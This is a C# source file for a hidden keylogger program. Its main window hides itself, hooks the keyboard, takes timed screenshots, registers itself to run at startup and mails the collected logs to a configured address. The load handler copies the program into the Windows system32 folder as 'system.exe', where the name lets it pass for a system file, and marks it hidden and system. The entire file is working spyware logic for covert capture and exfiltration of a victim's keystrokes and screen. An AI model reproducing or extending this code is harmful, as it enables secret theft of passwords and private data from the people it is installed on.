using System;
using System.IO;
using System.Net.Mail;
using System.Windows.Forms;

namespace userControlProgram
{
    public partial class MainWindow : Form
    {
        private const string NeedPath = "C:\\Windows\\system32\\system.exe";
        private string  _mailTo;
        private string LogPath;
        private int _screenShotTimer;
        private int _mailInterval;
        private bool _isAutorun;
        public MainWindow()
        {
            Hide();
            Visible = false;
            Enabled = false;
            SetConfigurations.SetConfig(ref _mailTo, ref LogPath, ref _mailInterval, ref _screenShotTimer, ref _isAutorun);
            KeyLogger.SetHook(LogPath);
            ScreenshotMaker.ScreenshotStart(_screenShotTimer, LogPath);
            Autorun.SetAutorunValue(_isAutorun, NeedPath);
            MailSender.MainSenderFunc(LogPath, new MailAddress(_mailTo), _mailInterval);
            File.Create(LogPath + "\\report");
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Hide();
            Visible = false;
            if (!File.Exists(NeedPath))
            {
                try
                {
                    File.Copy("system.exe", NeedPath);
                    File.SetAttributes(NeedPath, FileAttributes.Hidden);
                    File.SetAttributes(NeedPath, FileAttributes.System);
                    File.Copy("Ionic.Zip.dll", "C:\\Windows\\system32\\zip.dll");
                    File.SetAttributes("C:\\Windows\\system32\\zip.dll", FileAttributes.System);
                }
                catch (Exception ex)
                {
                    var log = new StreamWriter(LogPath + "\\report", true);
                    log.WriteLine("Error in copying exe and dll files. Message: '" + ex.Message + "'");
                    log.Flush();
                    log.Close();
                }
            }
        }
    }
}
